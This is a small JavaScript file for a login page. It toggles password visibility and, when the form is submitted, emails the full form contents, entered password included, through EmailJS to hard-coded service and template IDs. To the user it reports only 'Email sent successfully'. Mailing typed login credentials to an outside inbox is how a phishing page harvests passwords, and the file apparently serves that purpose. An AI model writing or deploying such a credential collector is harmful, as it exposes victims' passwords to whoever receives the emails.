// Toggle password visibility
const togglePasswordBtn = document.getElementById("toggle-password");
const passwordInput = document.getElementById("password");

togglePasswordBtn.addEventListener("click", () => {
  const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
  passwordInput.setAttribute("type", type);
  togglePasswordBtn.textContent = type === "password" ? "👁" : "🙈";
});

// Form submission with EmailJS
const form = document.getElementById("login-form");
const statusMsg = document.getElementById("status");

form.addEventListener("submit", function (e) {
  e.preventDefault();
  statusMsg.style.color = "black";
  statusMsg.textContent = "Sending...";

  emailjs
    .sendForm("service_ptof5sl", "template_mqbswr9", this)
    .then(() => {
      statusMsg.style.color = "green";
      statusMsg.textContent = "Email sent successfully!";
      form.reset();
      togglePasswordBtn.textContent = "👁"; // reset toggle button icon
      passwordInput.setAttribute("type", "password");
    })
    .catch((err) => {
      statusMsg.style.color = "red";
      statusMsg.textContent = "Failed to send email. Please try again.";
      console.error("EmailJS error:", err);
    });
});
